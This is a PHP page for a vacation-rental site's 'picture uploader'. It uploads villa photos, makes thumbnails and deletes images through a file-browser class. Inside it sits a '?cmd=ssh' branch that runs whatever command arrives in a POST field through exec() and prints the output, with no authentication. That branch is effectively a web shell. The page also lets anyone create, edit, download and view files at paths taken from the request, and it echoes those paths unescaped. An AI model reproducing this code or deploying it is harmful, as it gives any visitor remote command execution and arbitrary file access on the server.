<?php
error_reporting(E_ALL & ~E_NOTICE);// Report all errors except E_NOTICE
ob_start();
session_start();

//error_reporting(E_ALL);
//ini_set("display_errors", 1);

require_once ('Browser.Class.php');

$oBrowser = new Browser(true);
if(!$_GET['v'])$_GET['v']=$_SESSION['directorio'];

$_GET['id']=$_SESSION['ID_renta'];
//echo $_SERVER['SERVER_NAME'];
 $ipAddress = $_SERVER['REMOTE_ADDR']; //die;
//echo $ipAddress;
if($_SERVER['SERVER_NAME']=='localhost'){/*local server*/
	$_REQUEST['dir']=$_SERVER["DOCUMENT_ROOT"]."/rentals.casalindacity.com/for_rent/tor_pics/photos/villa".$_GET['v']."/full";
	$dir_thumb=$_SERVER["DOCUMENT_ROOT"]."/rentals.casalindacity.com/for_rent/tor_pics/photos/villa".$_GET['v']."/thumb";
}else{
	$_REQUEST['dir']=$_SERVER["DOCUMENT_ROOT"]."/for_rent/tor_pics/photos/villa".$_GET['v']."/full";
	$dir_thumb=$_SERVER["DOCUMENT_ROOT"]."/for_rent/tor_pics/photos/villa".$_GET['v']."/thumb";
}
$dir = trim($_REQUEST['dir']);  //directorio

if (!file_exists($dir)) {/*create folder if it's not there*/
    mkdir($dir, 0765, true);//1200x900px max
}
if (!file_exists($dir_thumb)) { /*create folder if it's not there*/
    mkdir($dir_thumb, 0765, true);
}

$_SESSION['directorio']=$_GET['v'];
$sEdit = trim($_REQUEST['edit']);
$sExtract = trim($_REQUEST['extract']);
$sViewFile = trim($_REQUEST['view']);

if (!$dir) {
   @ $dir    = getcwd().$oBrowser->separator;
}else{
    @$dir = trim($_REQUEST['dir']).$oBrowser->separator;
}

$dir = str_replace($oBrowser->separator.$oBrowser->separator, $oBrowser->separator, $dir);

if ($_POST['button'] == "Delete Selected Files") {
    $aFiles = $_POST['chkfiles'];
    $oBrowser->deleteFiles($aFiles);//delete full pictures
    $thumbs_del=str_replace("full","thumb",$aFiles,$i);//replace folders name
    $oBrowser->deleteFiles($thumbs_del); //delete thumb pictures
}

if ($_POST['button'] == "Create File") {
    $sCreatefile = trim($_POST['createfile']);
    $oBrowser->createFile($dir, $sCreatefile);
}
if ($_POST['button'] == "Create Directory") {
    $oBrowser->createDirectory($dir, trim($_POST['createfile']));
}
$sDownloadFile = trim($_REQUEST['dwl']);
if ($sDownloadFile) {
    $oBrowser->downloadFile($sDownloadFile);
    exit;
}
if ($sExtract != "") {
    $oBrowser->extract($sExtract);
}
if ($_POST['button'] == 'SAVEFILE') {
    $bBackup = trim($_POST['Write_backup']);
    $sFileData = trim($_POST['editfile']);
    $oBrowser->fileWriter($sEdit, $sFileData, $bBackup);
}


if ($sViewFile) {
    $oBrowser->viewFile($sViewFile);
    exit;
}


 //=================================================================================================================
 	function getExtension($str) {
		$i = strrpos($str,".");
		if (!$i) { return ""; }
		$l = strlen($str) - $i;
		$ext = substr($str,$i+1,$l);
		return $ext;
	}

define ("WIDTH","150");//THUMBNAIL WIDTH
define ("HEIGHT","100");//THUMBNAIL HEIGHT

// this is the function that will create the thumbnail image from the uploaded image
// the resize will be done considering the width and height defined, but without deforming the image
	function make_thumb($img_name,$filename,$new_w,$new_h)
	{
	//get image extension.
	$ext=getExtension($img_name);
	//creates the new image using the appropriate function from gd library
		if(!strcmp("jpg",$ext) || !strcmp("jpeg",$ext))
		$src_img=imagecreatefromjpeg($img_name);

		if(!strcmp("JPG",$ext) || !strcmp("JPEG",$ext))
		$src_img=imagecreatefromjpeg($img_name);

		if(!strcmp("png",$ext))
		$src_img=imagecreatefrompng($img_name);

		//gets the dimmensions of the image
		$old_x=imageSX($src_img);
		$old_y=imageSY($src_img);

		// next we will calculate the new dimmensions for the thumbnail image
		// the next steps will be taken:
		// 1. calculate the ratio by dividing the old dimmensions with the new ones
		// 2. if the ratio for the width is higher, the width will remain the one define in WIDTH variable
		// and the height will be calculated so the image ratio will not change
		// 3. otherwise we will use the height ratio for the image
		// as a result, only one of the dimmensions will be from the fixed ones
		$ratio1=$old_x/$new_w;
		$ratio2=$old_y/$new_h;
		if($ratio1>$ratio2) {
		$thumb_w=$new_w;
		$thumb_h=$old_y/$ratio1;
		}else {
		$thumb_h=$new_h;
		$thumb_w=$old_x/$ratio2;
		}

		// we create a new image with the new dimmensions
		$dst_img=ImageCreateTrueColor($thumb_w,$thumb_h);

		// resize the big image to the new created one
		imagecopyresampled($dst_img,$src_img,0,0,0,0,$thumb_w,$thumb_h,$old_x,$old_y);

		// output the created image to the file. Now we will have the thumbnail into the file named by $filename
		if(!strcmp("png",$ext))
		imagepng($dst_img,$filename);
		else
		imagejpeg($dst_img,$filename);

		//destroys source and destination images.
		imagedestroy($dst_img);
		imagedestroy($src_img);
	}
//echo $_FILES['myfile']['name'];
	//==============================================================================================================
	#time()
/*if(!is_array($_FILES["myfile"]['name'])) //single file
{	
$sFileName = $_FILES['myfile']['name'];
	if ($sFileName) {
		$oBrowser->uploadFile($dir, $sFileName);
		//MAKE THE THUMBNAIL BELLOW
		$thumb_name=dirname($dir)."/thumb/".$sFileName;
		$full_name=dirname($dir)."/full/".$sFileName;
		// call the function that will create the thumbnail. The function will get as parameters
		//the image name, the thumbnail name and the width and height desired for the thumbnail
		$newname=$dir.$sFileName;   //FROM FILE
		$thumb=make_thumb($newname,$thumb_name,WIDTH,HEIGHT);
		$thumb=make_thumb($newname,$full_name,$width='1200',$height='900');//resize original
	}
}else{
	$fileCount = count($_FILES["myfile"]['name']);
    	for($i=0; $i < $fileCount; $i++)
    	{
                $RandomNum   = time();
                $ImageName      = str_replace(' ','-',strtolower($_FILES['myfile']['name'][$i]));
                $ImageType      = $_FILES['myfile']['type'][$i]; //"image/png", image/jpeg etc.
                $ImageExt = substr($ImageName, strrpos($ImageName, '.'));
                $ImageExt       = str_replace('.','',$ImageExt);
                $ImageName      = preg_replace("/\.[^.\s]{3,4}$/", "", $ImageName);
                $NewImageName = $ImageName.'-'.$RandomNum.'.'.$ImageExt;
            $ret[$NewImageName]= $full_dir.$NewImageName;
    		 move_uploaded_file($_FILES["myfile"]["tmp_name"][$i],$dir.$NewImageName);
			 
			 $newname=$dir.$NewImageName;
			//CREATE A THUMBNAIL
			$thumb_name=dirname($dir)."/thumb/".$NewImageName;
			$thumb=make_thumb($newname,$thumb_name,WIDTH,HEIGHT);
			//RESIZE UPLOADED FILES
			$thumb=make_thumb($newname,$full_name=$dir.$NewImageName,$width='1200',$height='900');//resize original
	       $ret[$fileName]= $full_dir.$NewImageName;
    	}
}*/

if ($_POST['Submit']=='Upload'){
	$errors = array();
	$uploadedFiles = array();
	$extension = array("jpeg","jpg","png","gif","JPEG","JPG","PNG","GIF");
	$bytes = 1024;
	//$KB = 2048;//2 MB
	$KB = 10240;//10 MB
	$totalBytes = $bytes * $KB;
	//$UploadFolder = "UploadFolder";
	$UploadFolder =$_REQUEST['dir']; //die;
	$counter = 0;
	
	foreach($_FILES["myfile"]["tmp_name"] as $key=>$tmp_name){
		$temp = $_FILES["myfile"]["tmp_name"][$key];
		//$name = $_FILES["myfile"]["name"][$key];
		$RandomNum   = time();
		$name = $RandomNum.$_FILES["myfile"]["name"][$key];
		if(empty($temp))
		{
			break;
		}
		
		$counter++;
		$UploadOk = true;
		
		/*if($_FILES["myfile"]["size"][$key] > $totalBytes)
		{
			$UploadOk = false;
			array_push($errors, $name." file size is larger than the 10 MB.");
		}*/
		
		$ext = pathinfo($name, PATHINFO_EXTENSION);
		if(in_array($ext, $extension) == false){
			$UploadOk = false;
			array_push($errors, $name." is invalid file type.");
		}
		
		if(file_exists($UploadFolder."/".$name) == true){
			$UploadOk = false;
			array_push($errors, $name." file is already exist.");
		}
		
		if($UploadOk == true){
			move_uploaded_file($temp,$UploadFolder."/".$name);
			array_push($uploadedFiles, $name);
			//================cambiar tamaño al archivo subido y crear thumbnail==================================
			$newname=$name;
			//$NewImageName = $RandomNum.$name;
			$NewImageName = $name;
			$full_name=$dir.$newname;
			//CREATE A THUMBNAIL
			$thumb_name=dirname($dir)."/thumb/".$NewImageName;
			$thumb=make_thumb($archivo_entrada=$full_name,$thumb_name,WIDTH,HEIGHT);
			//RESIZE UPLOADED FILES
			$full_name_destino=$dir.$NewImageName;
			$full=make_thumb($archivo_entrada=$full_name,$full_name_destino,$width='2272',$height='1704');//resize original to 4 MB as per Home Away requirements
	       //$ret[$fileName]= $full_dir.$NewImageName;
		   	//================cambiar tamaño al archivo subido y crear thumbnail==================================
		}
	}
	
	if($counter>0){
		if(count($errors)>0)
		{
			echo "<b>Errors:</b>";
			echo "<br/><ul>";
			foreach($errors as $error)
			{
				echo "<li>".$error."</li>";
			}
			echo "</ul><br/>";
		}
		
		if(count($uploadedFiles)>0){
			echo "<b>Uploaded Files:</b>";
			echo "<br/><ul>";
			foreach($uploadedFiles as $fileName)
			{
				echo "<li>".$fileName."</li>";
			}
			echo "</ul><br/>";
			
			echo count($uploadedFiles)." file(s) are successfully uploaded.";
		}								
	}
	else{
		echo "Please, Select file(s) to upload.";
	}
}
 $sFiles = scandir(urldecode($dir));
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
	<meta name="robots" content="noindex">
	<meta http-equiv="expires" content="0">
	<meta http-equiv="pragma" content="no-cache">
	<style type="text/css">
	body {font-family:sans-serif; font-size: 10pt; color: #000000;}
    input {background-color: #efefef; color: #000000;}
	.border {margin: 1px; background-color:#ffffff; padding: 1em; border:1px solid #000000;}
    a {text-decoration:none; }
    a:hover { color : red; text-decoration : underline; }
    table.filelisting {background-color:#000000; width:100%; border:0px none #ffffff;}
	th {background-color:#f1f1f1;}
    td{background-color:#ffffff;padding-left:5px;font-family:sans-serif; font-size: 9pt; color: #000000;}
    .message{border: 1px solid #ffaaaa;background-color: #acffaa;padding:3px 3px 3px 5px;font-size: 9pt;color:#000;text-align:center;}
    .error{border: 1px solid #acffaa;background-color: #ffaaaa;padding:3px 3px 3px 5px;font-size: 10pt;color:#000;text-align:center;}
	</style>
	<script type="text/javascript">
    function filter (begriff) {
        var suche = begriff.value.toLowerCase();
        var table = document.getElementById("filetable");
        var ele;
        for(var r = 1; r < table.rows.length; r++) {
            ele = table.rows[r].cells[1].innerHTML.replace(/<[^>]+>/g,"");
            if(ele.toLowerCase().indexOf(suche)>=0 )
                table.rows[r].style.display = '';
            else table.rows[r].style.display = 'none';
        }
    }
    function selectAll(obj) {
        var oFileList = obj.elements['chkfiles[]'];
        for(i=0; i < oFileList.length; ++i) {
            if(obj.selall.checked == true)
                oFileList[i].checked = true;
            else
                oFileList[i].checked = false;
        }
    }
	</script>
	<title>picture uploader</title>
</head>
<body>
<?php
if ($oBrowser->sError) {
    echo "<p class=\"error\">".$oBrowser->sError."</p>";
}
if ($oBrowser->sMessage) {
    echo "<p class=\"message\">".$oBrowser->sMessage."</p>";
}
?>
<?php
if ($_GET['cmd'] == 'ssh') {
    $sSsh_command = trim($_POST['ssh_command']);
    if ($sSsh_command) {
        $aResult = array();
        exec($sSsh_command, $aResult);
    }
?>
<div>
		<br/>
		<div>
		<?php
			 if (is_array($aResult)) {
                 foreach ($aResult as $resultVal){
                     echo $resultVal."<br/>";
                 }
             }
				?>
		</div>
</div>
<?php
}
elseif($sEdit != "") {
    $oBrowser->readContent($sEdit, $contents);
?>

<?php }else{?>
<div>
	<div class="border">
		<form action="browser.php" method="POST" enctype="multipart/form-data">
			<p>
			<input type="text" name="dir" value="<?php echo $dir;?>" style="display:none"/>
			<input type="file" onKeypress="event.cancelBubble=true;" name="myfile[]" multiple="multiple">
			<input title="Upload selected file to the current working directory" type="Submit"  name="Submit" value="Upload"/>
			</p>
		</form>
	</div>
	<br/>
	<!--//PRESENTA LISTA DE IMAGENES DEL FOLDER MAS ABAJO//-->
	<form action="browser.php" method="Post" name="filelist" class="border">

		<table id="filetable" border="0" cellpadding="0px" cellspacing="1px" width="100%" class="filelisting">
			<tr >
				<th></th>
				<th>Name</th>
				<th>Size</th>
				<th>Preview</th>
			</tr>
		<?php
	    if (is_array($sFiles)) {
	        foreach ($sFiles as $file){
	                     $ext=substr(strrchr($dir.$file,'.'),1);
	                     $file_size=$oBrowser->showFileSize($file, $dir);
	                         ?>
	           <? if ($file_size=='Dir'){?>
	               <? $directory_nombre=$oBrowser->fileName($file, $dir);?>

				<?}else{?>
	               <? if (($ext=='jpg')||($ext=='JPG')||($ext=='png')||($ext=='gif')){?>
	              <tr >
					<td>
						<?php if ($file != "." && $file != "..") {?><input type="checkbox" id="chkfiles[]" name="chkfiles[]" value="<?php echo $_REQUEST['dir'].'/'.$file?>"/><?php } ?>
					</td>
					<td><?php echo $oBrowser->fileName($file, $dir);?></td>
					<td><?php echo $oBrowser->showFileSize($file, $dir);?></td>
					<td>
					<? if (($ext=='jpg')||($ext=='JPG')||($ext=='png')||($ext=='gif')){?>
					<img src="../../for_rent/tor_pics/photos/villa<?=$_GET['v']?>/full/<?=$oBrowser->fileName($file, $dir);?>" alt="" width="100" height="67" />
					<?}?>
					</td>
				</tr>
	             <?}?>
			   <?}?>

			<?php }

		} ?>

			<tr >
				<td colspan="7">
					<input type="checkbox" id="selall" name="selall" onClick="selectAll(this.form)">
					<label for="selall">
					Select All
					</label>
				</td>
			</tr>
		</table>
		<br/>
		<p>
		<input type="text" name="dir" value="<?php echo $dir;?>" style="display:none"/>
		<input title="Delete selected files and directories."  type="Submit" onclick="return confirm('Are you sure want to delete selected files');" name="button" value="Delete Selected Files">
		</p>

	</form>
</div>
		<?php }?>
</body>
</html>

